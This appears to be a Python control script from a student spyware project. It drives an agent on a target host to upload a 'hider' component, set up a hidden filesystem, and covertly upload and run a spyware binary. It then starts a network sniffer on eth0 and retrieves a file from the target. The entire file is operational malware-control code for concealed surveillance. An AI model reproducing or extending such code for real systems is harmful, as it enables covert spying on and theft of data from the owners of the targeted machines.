from connection import Connection
from agent import Agent
from command import Command
from responce import Responce
from funCode import FunCode
from time import sleep
from contParams import *
from structParams import *

# HOST = "192.168.83.131"
HOST = "localhost"
PORT_MANEGER = 65432
PORT_SPYWARE = 65410


def main():
    agent = Agent(HOST, PORT_MANEGER)
    targetHiderPath = "./sentHider.o"
    print(
        agent.write_file(
            "/home/avner/Arazim-Projects-2024---spyware/hider",
            targetHiderPath,
        )
    )
    print(agent.hider_setup(targetHiderPath, 'fs.iso', 'fs'))

    print(
        agent.hidden_action_with_upload(
            FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
            "/home/avner/Arazim-Projects-2024---spyware/spyware",
            "sentSpyware.spy",
        )
    )
    sleep(3)
    spyAgent = Agent(HOST, PORT_SPYWARE)
    print(spyAgent.hider_setup(targetHiderPath))

    params = ContParams(SnifferType, Params(SniffParams(20, b"eth0")))
    print(spyAgent.runContraption(params, 10))
    print(spyAgent.retrieve_file("fishTest.txt"))


if __name__ == "__main__":
    main()
